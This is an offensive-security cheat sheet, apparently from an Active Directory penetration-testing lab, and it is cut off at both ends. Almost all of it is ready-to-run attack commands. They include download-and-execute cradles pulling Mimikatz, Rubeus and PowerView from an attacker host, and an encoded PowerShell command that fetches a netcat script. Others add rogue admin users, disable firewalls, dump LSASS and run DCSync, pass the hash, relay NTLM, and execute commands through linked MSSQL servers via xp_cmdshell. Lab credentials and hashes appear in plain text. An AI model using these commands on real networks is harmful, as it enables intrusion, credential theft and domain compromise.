curl -o MiniDump.exe  http://192.168.49.57/Verified/bin/MiniDump.exe 
curl -o HollowEvade.exe  http://192.168.49.57/Verified/bin/HollowEvade.exe 
curl -o FilelessLateralMovement.exe  http://192.168.49.57/Verified/bin/FilelessLateralMovement.exe 


<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/SharpHound.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX<span class="p">;</span> Invoke-BloodHound -CollectionMethod All
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/PowerUp.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX<span class="p">;</span> Invoke-AllChecks <span class="p">|</span> Out-File -FilePath ~<span class="se">\p</span>owerup.txt
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/Invoke-Mimikatz.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/HostRecon.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/LAPSToolkit.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/PowerView.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/PowerUpSQL/PowerUpSQL.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/Powermad.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/powerviewv1.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX

<span class="nv">$wp</span><span class="o">=[</span>System.Reflection.Assembly<span class="o">]</span>::Load<span class="o">([</span>byte<span class="o">[]](</span>Invoke-WebRequest <span class="s1">&#39;http://192.168.49.57/Verified/bin/winPEASx64_ofs.exe&#39;</span> -UseBasicParsing <span class="p">|</span> Select-Object -ExpandProperty Content<span class="o">))</span><span class="p">;</span> <span class="o">[</span>winPEAS.Program<span class="o">]</span>::Main<span class="o">(</span><span class="s1">&#39;log&#39;</span><span class="o">)</span>

<span class="nv">$wp</span><span class="o">=[</span>System.Reflection.Assembly<span class="o">]</span>::Load<span class="o">([</span>byte<span class="o">[]](</span>Invoke-WebRequest <span class="s1">&#39;http://192.168.49.57/Verified/bin/Rubeus.exe&#39;</span> -UseBasicParsing <span class="p">|</span> Select-Object -ExpandProperty Content<span class="o">))</span><span class="p">;</span> <span class="o">[</span>Rubeus.Program<span class="o">]</span>::Main<span class="o">(</span><span class="s2">&#34;dump&#34;</span>.Split<span class="o">())</span>

<span class="c1">#TODO</span>
Invoke-ShareFinder
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/nice-function.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX<span class="p">;</span> Nice-Function -dd84f627e34042a19d0e69bbfb56125d <span class="nv">$buf</span>
</code></pre></div><h3 id="lateral-moment">Lateral moment</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
Lateral_Moment_commands
<span class="c1">################################################</span>
psexec.py : <span class="m">445</span>
dcomexec.py : 135,445,<span class="o">(</span><span class="m">49751</span> dcom<span class="o">)</span>
smbexec.py : <span class="m">445</span>
wmiexec.py : 135,445,<span class="o">(</span><span class="m">50911</span> winmgmt<span class="o">)</span>
atexec.py : <span class="m">445</span>
crackmapexec 

Invoke-Command -ComputerName dc02.dev.final.com -ScriptBlock <span class="o">{</span><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\p</span>roof.txt<span class="o">}</span>

evil-winrm -i 192.168.57.121 -u <span class="s1">&#39;blahblah\ted&#39;</span> -p <span class="s1">&#39;ksecurity&#39;</span>
evil-winrm -i 192.168.57.121 -u <span class="s1">&#39;blahblah\ted&#39;</span> -H <span class="s1">&#39;e929e69f7c290222be87968263a9282e&#39;</span>
</code></pre></div><h3 id="enable-rdp">Enable RDP</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">######################</span>
Enable RDP
<span class="c1">######################</span>
<span class="c1"># Add User</span>
net user evilme evilme /add
net localgroup <span class="s2">&#34;Administrators&#34;</span> evilme /add
net group <span class="s2">&#34;&#34;</span>Enterprise Admins<span class="s2">&#34;&#34;</span> offsec /add /domain
New-ItemProperty -Path <span class="s2">&#34;HKLM:\System\CurrentControlSet\Control\Lsa&#34;</span> -Name <span class="s2">&#34;DisableRestrictedAdmin&#34;</span> -Value <span class="m">0</span>

<span class="c1"># Allow Remote Access</span>
netsh firewall <span class="nb">set</span> opmode disable
reg add <span class="s2">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="m">0</span> /f
</code></pre></div><h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">%SystemRoot%<span class="se">\s</span>ysnative<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe 
.<span class="se">\R</span>ubeus.exe monitor /interval:1 /nowrap
.<span class="se">\P</span>sExec.exe -i -s -d powershell
.<span class="se">\S</span>poolSample.exe dc02.dmzacbank.com appsrv09.dmzacbank.com
</code></pre></div><h3 id="mimikatz">Mimikatz</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mimikat#
  privilege::debug
  !processprotect /process:lsass.exe /remove
  sekurlsa::logonpasswords
  lsadump::dcsync /all /csv
</code></pre></div><h3 id="kekeo">kekeo</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Export current user kerberos ticket.</span>
 tgt::delgate
</code></pre></div><h3 id="pass-the-hash-and-or-restricted-admin-login">Pass-The-Hash and or Restricted Admin login</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Pass-The-Hash and or Restricted Admin login</span>
// <span class="k">if</span> you want to connect to RDP using mimikatz
sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user<span class="s1">&#39;s ntlm hash&gt; /run:&#34;mstsc.exe /restrictedadmin&#34;
</span><span class="s1">
</span><span class="s1">// if you want to connect to target machine using mimikatz powershell
</span><span class="s1">mimikatz.exe &#34;sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user&#39;</span>s ntlm hash&gt; /run:powershell.exe<span class="s2">&#34;
</span><span class="s2">
</span><span class="s2">// if you want to connect to target machine using xfreedesktop
</span><span class="s2">Enter-PSSession -Computer &lt;Target&gt;
</span><span class="s2">New-ItemProperty -Path &#34;</span>HKLM:<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\L</span>sa<span class="s2">&#34; -Name &#34;</span>DisableRestrictedAdmin<span class="s2">&#34; -Value 0
</span><span class="s2">
</span><span class="s2">xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:&lt;Username&gt; /pth:&lt;NTLMHash&gt; /v:&lt;Hostname | IPAddress&gt; 
</span><span class="s2">xfreerdp /d: /u: /pth:HASH /v:HOST /cert-ignore -dynamic-resolution /drive:Verified,/path/to/Verified /timeout:60000
</span></code></pre></div><h3 id="blood-hound-queries">Blood-Hound Queries</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
Blood-Hound Queries
<span class="c1">################################################</span>
Return all computers.
    MATCH <span class="o">(</span>u:Computer<span class="o">)</span>  <span class="k">return</span> u.name

Return all nodes with outgoing permision.
    MATCH <span class="o">(</span>n<span class="o">)</span>-<span class="o">[</span>r<span class="o">]</span>-&gt;<span class="o">(</span>g<span class="o">)</span> where r.isacl <span class="o">=</span> <span class="nb">true</span> <span class="k">return</span> distinct<span class="o">(</span>n.name<span class="o">)</span>
</code></pre></div><h2 id="attacking-ad-from-linux">Attacking AD from Linux</h2>
<h3 id="turn-of-automatic-date-and-time">Turn of automatic date and time</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">timedatectl set-ntp <span class="m">0</span>
ntpdate 192.168.57.5
</code></pre></div><h3 id="crackmap">Crackmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#############################</span>
Crackmap
<span class="c1">#############################</span>
<span class="c1"># Generate a list of relayable hosts (SMB Signing disabled)</span>
crackmapexec smb --kdcHost 192.168.57.5  192.168.57.0/24 --gen-relay-list relay.txt 

<span class="c1"># PSEXEC</span>
crackmapexec smb  192.168.57.121   -d blahblah -u <span class="s1">&#39;ted&#39;</span> -H <span class="s1">&#39;:e929e69f7c290222be87968263a9282e&#39;</span> -x <span class="s1">&#39;whoami&#39;</span>

<span class="c1"># WINRM</span>
crackmapexec winrm 192.168.57.121   -d blahblah -u <span class="s1">&#39;ted&#39;</span> -H <span class="s1">&#39;e929e69f7c290222be87968263a9282e&#39;</span> -x <span class="s1">&#39;whoami&#39;</span>


<span class="c1"># Password_spray</span>
proxychains4 -q  crackmapexec smb 172.16.57.0/24 -u <span class="s1">&#39;Administrator&#39;</span> -d <span class="s1">&#39;.&#39;</span> -H <span class="s1">&#39;8388d07604009d14cbb78f7d37b9e887&#39;</span>

</code></pre></div><h3 id="linux-powerview">Linux Powerview</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#############################</span>
pywerview
<span class="c1">#############################</span>

<span class="c1">#  Hint:</span>
<span class="c1">#  use --hashes if you dont have passwowrd.  )</span>
<span class="c1">#  usefull: get-netdomaintrust, get-netgroupmember, get-netshare, get-netfileserver, get-netsubnet</span>

python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u <span class="s1">&#39;ted&#39;</span>  -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span>
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u <span class="s1">&#39;ted&#39;</span>  -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span>
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> 
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> --unconstrained
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> -spn <span class="s1">&#39;*&#39;</span>
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span> &gt; groupts.txt
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> --groupname PswReaders
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> 
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;blahblah.com&#39;</span> -t <span class="s1">&#39;dc03.blahblah.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> --unconstrained
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u <span class="s1">&#39;ted&#39;</span> -d <span class="s1">&#39;bolabola.com&#39;</span> -t <span class="s1">&#39;dc03.bolabola.com&#39;</span>  -p <span class="s1">&#39;ksecurity&#39;</span> --spn
</code></pre></div><h3 id="compare-groups-with-the-default-groups-and-find-the-difff">Compare Groups with the default groups and find the difff</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PATH : /mnt/hgfs/Shared_Folder/Verified/default_data/groups.txt
cat groupts.txt <span class="p">|</span> anew /mnt/hgfs/Shared_Folder/Verified/default_data/groups.txt
</code></pre></div><h3 id="convert-ticket-to-kerbi-formate">Convert Ticket to kerbi formate.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">##########################</span>
Convert Ticket to kerbi formate.
<span class="c1">########################</span>
<span class="c1"># Hint: If TGT ticket is not working please try using kekeo to get ticket tgt::delgate (This solved the problem of null sessions)</span>

cat /tmp/krb5cc_742201114_vjlDum <span class="p">|</span>base64 -w <span class="m">0</span>
<span class="nb">echo</span> <span class="s1">&#39;======&#39;</span> <span class="p">|</span> base64 -d &gt; user.ccache
ticketConverter.py user.ccache user.kirbi
mimikataz#
kerberos::ptt user.kirbi
Enter-PSSession -ComputerName web01

---From windows to linux
<span class="o">[</span>IO.File<span class="o">]</span>::WriteAllBytes<span class="o">(</span><span class="s2">&#34;ticket.kirbi&#34;</span>, <span class="o">[</span>Convert<span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s2">&#34;&lt;bas64_ticket&gt;&#34;</span><span class="o">))</span>
</code></pre></div><h3 id="impacket">Impacket</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">##########################################</span>
IMPACKET
<span class="c1">##########################################</span>
<span class="c1"># Hint: </span>
<span class="c1"># replace -hashes with -k -no-pass (if kerberos) </span>
<span class="c1"># IMPORTANT NOTE: DOMAIN NAME SHOULD NOT BE RETURN IN SINGLE QOUTE ELSE IT IS CASE SENSITIVE AND YOU WILL GET </span>
<span class="c1"># USE /etc/resolve.conf  #Because kerberos is  bitch.</span>

<span class="c1"># PSEXEC (Pass the Hash)</span>
impacket-psexec -hashes <span class="s2">&#34;:e929eds9f7c290222be87968263a9282d&#34;</span> <span class="s2">&#34;bolabola/ted&#34;</span>@192.168.57.121
impacket-psexec -no-pass -k  PROD.CORP1.COM/offsec@APPSRV01.PROD.CORP1.COM -dc-ip 192.168.57.70 

<span class="c1"># WMIEXEC (Pass the Hash)</span>
impacket-wmiexec -hashes <span class="s2">&#34;:e929e69f7c290222be87968263a9282e&#34;</span> <span class="s2">&#34;bolabola/ted&#34;</span>@192.168.57.121

<span class="c1"># NTLMRELAYX (NTLMV2 RELAY)</span>
impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c <span class="s1">&#39;whoami /all&#39;</span> -debug

<span class="c1"># Convert Ticket to kerbi formate.</span>
python ticket_converter.py ticket.kirbi ticket.ccache
kirbi2ccache ticket.kirbi wow.ccache
<span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;TGT_ccache_file&gt;

<span class="c1"># DCSYNC</span>
impacket-secretsdump -just-dc  <span class="s1">&#39;bolabola/pete@192.168.57.120&#39;</span> -hashes <span class="s2">&#34;:00f50c4047ef95b6349492e3eb0a1b41&#34;</span>

<span class="c1"># Normal pc secrets dump</span>
impacket-secretsdump   <span class="s1">&#39;bolabola/pete@192.168.57.121&#39;</span> -hashes <span class="s2">&#34;:00f50c4047ef95b6349492e3eb0a1b41&#34;</span>

<span class="c1"># Get user emails</span>
impacket-GetADUsers -no-pass -k  bolabola.com/offsec -dc-ip 192.168.57.5 

<span class="c1"># Kerberoasting / relay Attacks</span>
impacket-GetUserSPNs -no-pass -k  bolabola.com/offsec -dc-ip 192.168.57.5  -outputfile lab1/output_tgs


<span class="c1"># MSSQL CONNECT &amp; SMB RELAY ATTACK</span>
impacket-mssqlclient -no-pass  -k    bolabola.com/offsec@appsrv01.bolabola.com
impacket-mssqlclient -no-pass  -k    bolabola.com/offsec@dc01.bolabola.com
</code></pre></div><h3 id="mssql-queries">MSSQL Queries</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">###########################################</span>
<span class="c1">#   MSSQL - Queries</span>
<span class="c1">##########################################</span>
<span class="c1"># https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs</span>
<span class="c1"># use db &#34;master&#34;</span>

<span class="c1"># Enumerate login info</span>
SELECT SYSTEM_USER<span class="p">;</span>

<span class="c1"># Enumerate database username.</span>
SELECT USER_NAME<span class="o">()</span><span class="p">;</span>

<span class="c1"># Enumerate if user is member of Public or Sysadmin. If role is one then true.</span>
SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">&#39;public&#39;</span><span class="o">)</span><span class="p">;</span>
SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="o">)</span><span class="p">;</span>

<span class="c1"># Force NTLM authentication for hash-grabbing or relaying</span>
EXEC master..xp_dirtree <span class="s2">&#34;\192.168.49.67\share&#34;</span>
impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c <span class="s1">&#39;whoami /all&#39;</span> -debug

<span class="c1"># Get logins that we can impersonate</span>
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id <span class="o">=</span> b.principal_id WHERE a.permission_name <span class="o">=</span> <span class="s1">&#39;IMPERSONATE&#39;</span><span class="p">;</span> 

<span class="c1"># Impersonate login and get login information</span>
EXECUTE AS <span class="nv">LOGIN</span> <span class="o">=</span> <span class="s1">&#39;sa&#39;</span><span class="p">;</span>
use msdb<span class="p">;</span> EXECUTE AS <span class="nv">USER</span> <span class="o">=</span> <span class="s1">&#39;dbo&#39;</span><span class="p">;</span>

<span class="c1"># Impersonate dbo in trusted database and execute through &#39;xp_cmdshell&#39;</span>
use msdb<span class="p">;</span> EXECUTE AS <span class="nv">USER</span> <span class="o">=</span> <span class="s1">&#39;dbo&#39;</span><span class="p">;</span>
EXEC sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 1<span class="p">;</span> RECONFIGURE<span class="p">;</span> EXEC sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, 1<span class="p">;</span> RECONFIGURE<span class="p">;</span>
EXEC xp_cmdshell <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>

<span class="c1"># Impersonate dbo in trusted database and execute through &#39;sp_OACreate&#39; </span>
use msdb<span class="p">;</span> EXECUTE AS <span class="nv">USER</span> <span class="o">=</span> <span class="s1">&#39;dbo&#39;</span><span class="p">;</span>
EXEC sp_configure <span class="s1">&#39;Ole Automation Procedures&#39;</span>, 1<span class="p">;</span> RECONFIGURE<span class="p">;</span>
DECLARE @myshell INT<span class="p">;</span> EXEC sp_oacreate <span class="s1">&#39;wscript.shell&#39;</span>, @myshell OUTPUT<span class="p">;</span> EXEC sp_oamethod @myshell, <span class="s1">&#39;run&#39;</span>, null, <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>

<span class="c1">########</span>
<span class="c1"># Enumerate linked servers</span>
<span class="c1">########</span>
EXEC sp_linkedservers<span class="p">;</span>
Linked SQL server: DC01


<span class="c1">#########</span>
<span class="c1"># Execute on linked server</span>
<span class="c1">#########</span>
EXECUTE AS <span class="nv">LOGIN</span> <span class="o">=</span> <span class="s1">&#39;sa&#39;</span><span class="p">;</span>
EXEC sp_serveroption <span class="s1">&#39;SQL03&#39;</span>, <span class="s1">&#39;rpc out&#39;</span>, <span class="s1">&#39;true&#39;</span><span class="p">;</span>
EXEC <span class="o">(</span><span class="s1">&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;</span><span class="o">)</span> AT SQL03<span class="p">;</span>
EXEC <span class="o">(</span><span class="s1">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure;&#39;</span><span class="o">)</span> AT SQL03<span class="p">;</span>
EXEC <span class="o">(</span><span class="s1">&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39;;&#39;</span><span class="o">)</span> AT SQL03<span class="p">;</span>
EXEC <span class="o">(</span><span class="s1">&#39;xp_cmdshell &#39;&#39;powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANwAvAFYAZQByAGkAZgBpAGUAZAAvAHAAcwAvAG4AYwAuAHQAeAB0ACcAKQA7AA==&#39;&#39;;&#39;</span><span class="o">)</span> AT SQL03<span class="p">;</span>

<span class="c1">############</span>
<span class="c1"># Execute on linked server via &#39;openquery&#39;</span>
<span class="c1">############</span>
<span class="k">select</span> version from openquery<span class="o">(</span><span class="s2">&#34;dc01&#34;</span>, <span class="s1">&#39;select @@version as version&#39;</span><span class="o">)</span>
<span class="k">select</span> <span class="m">1</span> from openquery<span class="o">(</span><span class="s2">&#34;dc01&#34;</span>, <span class="s1">&#39;select 1; EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure&#39;</span><span class="o">)</span>
<span class="k">select</span> <span class="m">1</span> from openquery<span class="o">(</span><span class="s2">&#34;dc01&#34;</span>, <span class="s1">&#39;select 1; EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure&#39;</span><span class="o">)</span>
<span class="k">select</span> <span class="m">1</span> from openquery<span class="o">(</span><span class="s2">&#34;dc01&#34;</span>, <span class="s1">&#39;select 1; exec xp_cmdshell &#39;</span><span class="s2">&#34;powershell whoami&#34;</span><span class="s1">&#39;)
</span><span class="s1">select * from openquery(&#34;sql03&#34;,&#39;</span><span class="nb">exec</span> master..xp_cmdshell <span class="s2">&#34;powershell whoami&#34;</span><span class="s1">&#39;)
</span><span class="s1">
</span><span class="s1">############
</span><span class="s1"># Escalate via double database linkedString
</span><span class="s1">##############
</span><span class="s1">
</span><span class="s1"># Enabling advanced options on appsrv01 using AT
</span><span class="s1">EXEC (&#39;</span>EXEC <span class="o">(</span><span class="s1">&#39;&#39;</span>sp_configure <span class="s1">&#39;&#39;&#39;&#39;</span>show advanced options<span class="s1">&#39;&#39;&#39;&#39;</span>, 1<span class="p">;</span> reconfigure<span class="p">;</span><span class="s1">&#39;&#39;</span><span class="o">)</span> AT appsrv01<span class="s1">&#39;) AT dc01
</span><span class="s1">
</span><span class="s1"># Find the login on DC01
</span><span class="s1">select mylogin from openquery(&#34;dc01&#34;, &#39;</span><span class="k">select</span> SYSTEM_USER as mylogin<span class="s1">&#39;);
</span><span class="s1">
</span><span class="s1">#  Finding the login on APPSRV01 after following the links
</span><span class="s1">select mylogin from openquery(&#34;dc01&#34;, &#39;</span><span class="k">select</span> mylogin from openquery<span class="o">(</span><span class="s2">&#34;appsrv01&#34;</span>, <span class="s1">&#39;&#39;</span><span class="k">select</span> SYSTEM_USER as mylogin<span class="s1">&#39;&#39;</span><span class="o">)</span><span class="s1">&#39;)
</span><span class="s1">
</span><span class="s1">select * from openquery(&#34;dc01&#34;, &#39;</span><span class="k">select</span> * from openquery<span class="o">(</span><span class="s2">&#34;appsrv01&#34;</span>, <span class="s1">&#39;&#39;</span><span class="k">select</span> <span class="o">(</span>SYSTEM_USER<span class="o">)</span><span class="s1">&#39;&#39;</span><span class="o">)</span><span class="s1">&#39;)
</span><span class="s1">EXEC (&#39;</span>EXEC <span class="o">(</span><span class="s1">&#39;&#39;</span>sp_configure <span class="s1">&#39;&#39;&#39;&#39;</span>show advanced options<span class="s1">&#39;&#39;&#39;&#39;</span>, 1<span class="p">;</span> reconfigure<span class="p">;</span><span class="s1">&#39;&#39;</span><span class="o">)</span> AT appsrv01<span class="s1">&#39;) AT dc01
</span><span class="s1">EXEC (&#39;</span>EXEC <span class="o">(</span><span class="s1">&#39;&#39;</span>sp_configure <span class="s1">&#39;&#39;&#39;&#39;</span>xp_cmdshell<span class="s1">&#39;&#39;&#39;&#39;</span>, 1<span class="p">;</span> reconfigure<span class="p">;</span><span class="s1">&#39;&#39;</span><span class="o">)</span> AT appsrv01<span class="s1">&#39;) AT dc01
</span><span class="s1">EXEC (&#39;</span>EXEC <span class="o">(</span><span class="s1">&#39;&#39;</span>xp_cmdshell <span class="s1">&#39;&#39;&#39;&#39;</span>whoami /priv<span class="s1">&#39;&#39;&#39;&#39;</span><span class="p">;</span><span class="s1">&#39;&#39;</span><span class="o">)</span> AT appsrv01<span class="err">&#39;</span><span class="o">)</span> AT dc01
</code></pre></div><h3 id="powerup-sql">Powerup SQL</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">##############################</span>
Powerup SQL
<span class="c1">##############################</span>
<span class="c1"># Find sql servers</span>
Get-SQLInstanceDomain <span class="p">|</span> Get-SQLServerInfo -Verbose

<span class="c1"># Audit the SQL instance</span>
Invoke-SQLAudit -Verbose -Instance SQLServer1

<span class="c1"># Privielge Esclate using powerupsql.</span>
Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1

<span class="c1"># Get linked servers.</span>
Get-SQLServerLinkCrawl -Instance  web06

Executing Commands 
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query <span class="s2">&#34;exec master..xp_cmdshell &#39;whoami&#39;
</span><span class="s2">
</span><span class="s2">Get-SQLQuery -Verbose -Instance &#34;</span>web06.dev.final.com<span class="s2">&#34; -Query &#34;</span>EXEC sp_serveroption <span class="s1">&#39;SQL03&#39;</span>, <span class="s1">&#39;rpc out&#39;</span>, <span class="s1">&#39;true&#39;</span><span class="p">;</span><span class="s2">&#34; 
</span><span class="s2">Get-SQLQuery -Verbose -Instance &#34;</span>web06.dev.final.com<span class="s2">&#34; -Query &#34;</span>EXEC sp_serveroption <span class="s1">&#39;SQL03&#39;</span>, <span class="s1">&#39;rpc&#39;</span>, <span class="s1">&#39;true&#39;</span><span class="p">;</span><span class="s2">&#34;
</span></code></pre></div><h3 id="cracking-hashes">Cracking hashes.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">##############################################</span>
Cracking
<span class="c1">#############################################</span>

<span class="c1"># Cracking Net NTLMv2 HASH</span>
hashcat -m <span class="m">5600</span> hash.txt dic.txt --force

<span class="c1"># Cracking Kerberoasting, getuserspn, tgs files</span>
hashcat -m <span class="m">13100</span> --force &lt;TGSs_file&gt; &lt;passwords_file&gt;
john --format<span class="o">=</span>krb5tgs --wordlist<span class="o">=</span>&lt;passwords_file&gt; &lt;AS_REP_responses_file&gt;

<span class="c1"># Cracking ssh private key password.</span>
/usr/share/john/ssh2john.py id_rsa.johny &gt; sshhash.txt
john sshhash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt


<span class="c1"># Cracking Ansible</span>
ansible2john test.yml
hashcat testhash.txt --force --hash-type<span class="o">=</span><span class="m">16900</span>
cat pw.txt <span class="p">|</span> ansible-vault decrypt


<span class="c1"># Bcyrpt</span>
sudo john derbyhash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</code></pre></div><h3 id="metasploit-reverse-shell">Metasploit Reverse shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">.........................................MSF CONSOLE...................................................

Paylaod Generator: reverse_https:raw
